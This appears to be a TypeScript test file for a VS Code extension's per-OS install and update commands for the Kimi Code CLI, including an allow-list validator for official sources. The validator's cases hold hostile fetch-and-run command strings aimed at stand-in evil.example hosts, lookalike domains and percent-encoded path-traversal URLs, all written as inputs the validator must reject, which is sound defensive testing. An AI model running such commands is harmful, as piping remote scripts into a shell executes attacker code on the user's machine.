import assert from 'node:assert/strict';
import { spawnSync } from 'node:child_process';
import { readFileSync } from 'node:fs';
import { join } from 'node:path';
import { test } from 'node:test';

import { fromOfficialSources, OFFICIAL_SOURCES, vendorInstall, vendorUpdate } from '../vendorTerminal';
import type { Vendor } from '../vendors';

/**
 * ⤓ and ⟳ for Kimi Code, per OS (E4.5 of todo/PLAN_vibe_and_kimi_runtimes_E4.md; the owner's order of 2026-10-13 that
 * "the install buttons must WORK, per OS", and the plan round's of 2026-10-14 that they also PROVISION ripgrep and fd on
 * Windows, because a Kimi launch is refused before any process when either is missing — D19).
 *
 * <p><b>The command is never RUN here</b> (`kimiWindowsInstallRuns.test.ts` runs it against stand-ins): it installs
 * software. It is asserted over its PARSED form, by PowerShell's own parser, as `vibeWindowsInstall.test.ts` does.</p>
 */

const KIMI: Vendor = {
  id: 'kimi', runtime: 'kimi', model: 'kimi-code/k3-256k', enabled: true, plan: true, code: true,
  baseUrl: '', executablePath: '', pricePerMillionIn: 0, pricePerMillionOut: 0,
};

const MOONSHOT_PS1 = 'irm https://code.kimi.com/kimi-code/install.ps1 | iex';
const MOONSHOT_SH = 'curl -fsSL https://code.kimi.com/kimi-code/install.sh | bash';
// `--source winget` pins the community repository: without it winget searches msstore too, and an id could resolve there.
const FLAGS = '-e --source winget --accept-source-agreements --accept-package-agreements';
const repo = (...parts: string[]): string => join(__dirname, '..', '..', '..', ...parts);

/** PowerShell's parse of a command line: its errors, and the text of every command in it, in order. */
interface Parsed {
  readonly errors: readonly string[];
  readonly commands: readonly string[];
}

/** Parses, never runs: the text arrives through the environment, so nothing of it is ever on a command line. */
const PARSE = '$t = $null; $e = $null; '
  + '$a = [System.Management.Automation.Language.Parser]::ParseInput($env:COAI_PS_TEXT, [ref]$t, [ref]$e); '
  + '$c = @($a.FindAll({ param($n) $n -is [System.Management.Automation.Language.CommandAst] }, $true) | ForEach-Object { $_.Extent.Text }); '
  + '[pscustomobject]@{ errors = @($e | ForEach-Object { $_.Message }); commands = $c } | ConvertTo-Json -Compress -Depth 3';

function powerShell(): string {
  for (const exe of ['pwsh', 'powershell']) {
    if (spawnSync(exe, ['-NoProfile', '-NonInteractive', '-Command', 'exit 0'], { timeout: 30_000 }).status === 0) {
      return exe;
    }
  }

  return '';
}

const SHELL = powerShell();

function parsed(text: string): Parsed {
  const env = { PATH: process.env['PATH'] ?? '', SystemRoot: process.env['SystemRoot'] ?? '', COAI_PS_TEXT: text };
  const run = spawnSync(SHELL, ['-NoProfile', '-NonInteractive', '-Command', PARSE], { env, encoding: 'utf8', timeout: 60_000 });
  assert.equal(run.status, 0, `PowerShell could not parse the command: ${run.stderr}`);

  return JSON.parse(run.stdout) as Parsed;
}

const skip = SHELL === '' ? 'no PowerShell on this machine — the parse needs pwsh or powershell' : false;

// ---------------------------------------------------------------- S5.7 install is Moonshot's per OS

test('installIsMoonshotsPerOs: macOS gets Moonshot’s script alone; Linux the tools first (kimiLinuxInstall.test.ts runs it); Windows the tools first, then Moonshot’s', () => {
  const mac = vendorInstall(KIMI, 'darwin');

  assert.equal(mac.command, MOONSHOT_SH);
  assert.equal(mac.prerequisite, '', 'the script needs nothing run first');
  assert.equal(mac.docs, 'https://www.kimi.com/code/docs/en/kimi-code-cli/guides/getting-started');
  const linux = vendorInstall(KIMI, 'linux', 'wsl2');
  assert.ok(linux.command.includes(MOONSHOT_SH), 'the Linux line still ends in Moonshot’s script');
  assert.notEqual(linux.command, MOONSHOT_SH, 'and provisions ripgrep and fd before it (DL12)');
  assert.equal(linux.docs, mac.docs);

  const windows = vendorInstall(KIMI, 'win32');
  assert.equal(windows.prerequisite, '', 'nothing is left for the person to run first');
  assert.ok(windows.command.endsWith(MOONSHOT_PS1), `Moonshot’s step is not the last: ${windows.command}`);
  const at = (id: string): number => windows.command.indexOf(`winget install --id ${id} ${FLAGS}`);
  assert.ok(at('Git.Git') >= 0 && at('BurntSushi.ripgrep.MSVC') > at('Git.Git') && at('sharkdp.fd') > at('BurntSushi.ripgrep.MSVC'),
    `the three winget steps are not Git, ripgrep, fd in that order: ${windows.command}`);
});

test('⤓ on Windows is ONE press that skips what is there: every tool step is guarded by a look-up of the tool', () => {
  const { command } = vendorInstall(KIMI, 'win32');

  for (const [tool, id] of [['git', 'Git.Git'], ['rg', 'BurntSushi.ripgrep.MSVC'], ['fd', 'sharkdp.fd']] as const) {
    const guard = `if (-not (Get-Command ${tool} -ErrorAction SilentlyContinue)) { winget install --id ${id} ${FLAGS};`;
    assert.ok(command.includes(guard), `${tool}: the step is not guarded by Get-Command ${tool}: ${command}`);
  }
});

test('⤓ on Windows: each failed step STOPS the line, in words that name the tool', () => {
  const { command } = vendorInstall(KIMI, 'win32');
  const stops = command.match(/if \(-not \$\? -or \$LASTEXITCODE -ne 0\) \{ throw '[^']+' \}/gu) ?? [];

  assert.equal(stops.length, 3, `each winget step must be followed by a stop on its failure ($? and the exit code): ${command}`);
  assert.deepEqual(stops.map((stop) => /git|ripgrep|fd/iu.exec(stop)?.[0]?.toLowerCase()), ['git', 'ripgrep', 'fd']);
});

test('⤓ for Kimi says where it lands, that VS Code must restart, and that the sign-in is the person’s', () => {
  const win = vendorInstall(KIMI, 'win32').note;

  assert.match(win, /\.kimi-code\\bin/u, 'the note does not say where Kimi lands');
  assert.match(win, /restart VS Code/iu, 'VS Code’s terminals inherit their PATH from when it started');
  assert.match(win, /kimi/u);
  assert.match(win, /\/login/u, 'the sign-in is `kimi`, then `/login`, which only the person can do');
  assert.match(win, /ripgrep/iu);
  assert.match(win, /Git/u, 'Kimi runs its shell through Git for Windows');
  for (const platform of ['linux', 'darwin'] as const) {
    const note = vendorInstall(KIMI, platform).note;
    assert.match(note, /shell rc file|rc file/iu, `${platform}: the script edits one rc file`);
    assert.match(note, /\/login/u, platform);
    assert.match(note, platform === 'darwin' ? /does not run Kimi on macOS/u : /measured on WSL2 only/u, `${platform}: the button installs; where a review waits, the note says why`);
    assert.match(note, /▶/u, platform);
  }
});

// ---------------------------------------------------------------- S5.8 update is the installer again

test('updateIsTheInstallerAgain: the same line on every platform, never `kimi upgrade`, never npm', () => {
  for (const platform of ['win32', 'linux', 'darwin'] as const) {
    for (const installed of ['', '2.1.1']) {
      const update = vendorUpdate(KIMI, platform, installed);

      assert.equal(update.command, vendorInstall(KIMI, platform).command, `${platform} ${installed}`);
      assert.doesNotMatch(update.command, /upgrade|npm/u, 'the 302 script re-run IS the update; `kimi upgrade` is unmeasured here');
      assert.ok(fromOfficialSources(update.command), `${platform}: the update draws on a source that is not official`);
    }
  }
});

test('every Kimi install command comes only from sources Moonshot, Git, BurntSushi and sharkdp publish', () => {
  for (const platform of ['win32', 'linux', 'darwin'] as const) {
    assert.ok(fromOfficialSources(vendorInstall(KIMI, platform).command), `${platform} install`);
  }
});

test('the panel’s install commands are the ones coai-mcp names when it finds no Kimi', () => {
  // reads-another-program: a positive claim about VendorDiagnosis.InstallCure — Moonshot's two lines must appear verbatim in
  // the server's own cure sentence, so the panel and a failed round never tell a person two different installs.
  const source = readFileSync(repo('src_mcp', 'runners', 'Reviewers', 'VendorDiagnosis.cs'), 'utf8').replaceAll('\\"', '"');
  // The kimi arms, ended by the NEXT arm (claude's): since #823 the switch is (runtime, host != Windows) — the true arm is Linux, WSL and
  // macOS (the vendor's shell script), the false arm Windows — and the cure may be interpolated from KimiTools, so the slice is read as
  // two arms rather than as one line's text.
  const start = source.indexOf('("kimi", true)');
  const end = source.indexOf('("claude", _)');
  assert.ok(start > 0 && end > start, 'coai-mcp’s InstallCure has no kimi arms where this test looks for them');
  const kimi = source.slice(start, end);
  const windowsArm = kimi.slice(kimi.indexOf('("kimi", false)'));
  const scriptArm = kimi.slice(0, kimi.indexOf('("kimi", false)'));

  assert.ok(scriptArm.includes(MOONSHOT_SH), 'the Linux, WSL and macOS script differs from coai-mcp’s cure');
  assert.ok(windowsArm.includes(MOONSHOT_PS1), 'the Windows script differs from coai-mcp’s cure');
  assert.ok(windowsArm.includes('winget install --id Git.Git -e'), 'coai-mcp’s Windows cure does not name the Git step the button runs');
  assert.ok(windowsArm.includes('KimiTools.RipgrepInstall') && windowsArm.includes('KimiTools.FdInstall'), 'coai-mcp’s Windows cure does not name the ripgrep and fd steps');

  // reads-another-program: a positive claim about KimiTools — the two commands coai-mcp's refusal names for the tools a Kimi
  // launch is refused without are the steps this line runs, so a changed id on the server fails here loudly.
  const tools = readFileSync(repo('src_mcp', 'runners', 'Kimi', 'KimiTools.cs'), 'utf8');
  const line = vendorInstall(KIMI, 'win32').command;
  for (const step of ['winget install --id BurntSushi.ripgrep.MSVC -e', 'winget install --id sharkdp.fd -e']) {
    assert.ok(tools.includes(`"${step}"`), `coai-mcp’s refusal no longer names: ${step}`);
    assert.ok(line.includes(step), `the panel’s line does not run: ${step}`);
  }
});

// ---------------------------------------------------------------- S5.10 the line parses

test('theWindowsLineParsesInPowerShell: no parse error, the look-ups before their installs, Moonshot’s step last', { skip }, () => {
  const { errors, commands } = parsed(vendorInstall(KIMI, 'win32').command);
  const at = (text: string): number => commands.findIndex((one) => one.includes(text));

  assert.deepEqual(errors, [], 'PowerShell refuses the command it would be handed');
  for (const [tool, id] of [['git', 'Git.Git'], ['rg', 'BurntSushi.ripgrep.MSVC'], ['fd', 'sharkdp.fd']] as const) {
    assert.ok(at(`Get-Command ${tool} `) >= 0, `${tool} is not looked for`);
    assert.ok(at(`winget install --id ${id} `) > at(`Get-Command ${tool} `), `${id} is installed before ${tool} is looked for`);
  }
  assert.ok(at('winget install --id sharkdp.fd') < at('irm https://code.kimi.com/kimi-code/install.ps1'), 'Moonshot’s step runs before the tools');
  assert.equal(commands.at(-1), 'iex');
  assert.equal(commands.at(-2), 'irm https://code.kimi.com/kimi-code/install.ps1');
});

// ---------------------------------------------------------------- S5.9 official sources

test('officialSourcesAdmitOnlyMoonshotsPath_AndTheThreeWingetIds', () => {
  const cases: readonly (readonly [string, boolean])[] = [
    [MOONSHOT_PS1, true],
    ['irm https://code.kimi.com/kimi-code.evil.example/install.ps1 | iex', false],
    ['irm https://code.kimi.com.evil.example/kimi-code/install.ps1 | iex', false],
    ['irm https://code.kimi.com/other/x.ps1 | iex', false],
    [`${MOONSHOT_PS1}; irm https://evil.example/x.ps1 | iex`, false],
    ['winget install --id sharkdp.fd -e', true],
    ['winget install --id BurntSushi.ripgrep.MSVC -e --accept-source-agreements', true],
    ['winget install --id Git.Git -e --accept-source-agreements --accept-package-agreements', true],
    ['winget install --id Evil.Tool -e', false],
    // minor 2: the community repository, named exactly, and an EXACT match required (a fuzzy id could resolve to another package)
    ['winget install --id sharkdp.fd -e --source winget', true],
    ['winget install --id sharkdp.fd --exact --source winget', true],
    ['winget install --id sharkdp.fd --source winget', false],
    ['winget install --id sharkdp.fd', false],
    ['winget install --id sharkdp.fd -e --source msstore', false],
    ['winget install --id sharkdp.fd -e --source winget --source msstore', false],
    ['winget install --id sharkdp.fd -e --source', false],
    ['winget install --id sharkdp.fd -e winget', false],
    // minor 3: a prefix match is not a path match - a parent segment, plain or percent-encoded in any case, leaves the admitted folder
    ['irm https://code.kimi.com/kimi-code/../evil/x.ps1 | iex', false],
    ['irm https://code.kimi.com/kimi-code/%2e%2e/evil/x.ps1 | iex', false],
    ['irm https://code.kimi.com/kimi-code/%2E%2e/evil/x.ps1 | iex', false],
    ['irm https://code.kimi.com/kimi-code/.%2E/evil/x.ps1 | iex', false],
    ['curl -fsSL https://code.kimi.com/kimi-code/../../evil.sh | bash', false],
    ['curl -fsSL https://mistral.ai/vibe/../evil.sh | bash', false],
    ['winget install --id sharkdp.fd --source https://evil.example', false],
    ['winget install --id sharkdp.fd --source evil', false],
    ['winget install --manifest C:\\x.yaml', false],
    ['winget install --id sharkdp.fd -v 1.0', false],
    ['winget install --id sharkdp.fd --version 1.0', false],
    ['winget install --id sharkdp.fd --location C:\\evil', false],
    ['winget install --id sharkdp.fd --id Git.Git', false],
    ['winget install sharkdp.fd Git.Git', false],
    ['winget install --id sharkdp.fd -e; winget install --id Evil.Tool -e', false],
    ['npm install -g @openai/codex', true],
  ];

  for (const [command, official] of cases) {
    assert.equal(fromOfficialSources(command), official, command);
  }
});

test('the admitted sources are exactly these — Moonshot’s path, never cdn.kimi.com, and nothing is npm-installed for Kimi', () => {
  assert.deepEqual([...OFFICIAL_SOURCES.urls], [
    'https://antigravity.google/', 'https://mistral.ai/vibe/', 'https://astral.sh/uv/', 'https://code.kimi.com/kimi-code/',
  ]);
  assert.deepEqual([...OFFICIAL_SOURCES.packages], ['@openai/codex', '@google/gemini-cli', '@anthropic-ai/claude-code', 'mistral-vibe']);
  assert.deepEqual([...OFFICIAL_SOURCES.wingetIds], ['Git.Git', 'BurntSushi.ripgrep.MSVC', 'sharkdp.fd']);
});

test('the Windows note says the line is Moonshot’s installer, not a command on the row’s CLI path — ⟳ updates the default install', () => {
  // vendorUpdate takes the platform and the installed version, not the row's path, so a Kimi row with its own CLI path (another folder, a
  // KIMI_INSTALL_DIR) is not what ⟳ updates: the script installs into %USERPROFILE%\.kimi-code\bin unless told otherwise. Said, not hidden.
  const own = { ...KIMI, executablePath: 'D:\\tools\\kimi\\kimi.exe' };
  const { note, command } = vendorUpdate(own, 'win32', '2.1.1');

  assert.match(note, /CLI path/u, 'the note does not warn that ⟳ ignores the row’s CLI path');
  assert.match(note, /\.kimi-code\\bin/u);
  assert.ok(!command.includes('D:\\tools'), 'a path must not be put into the command');
  assert.equal(command, vendorInstall(KIMI, 'win32').command, 'the update is the same line whatever the row’s CLI path');
});
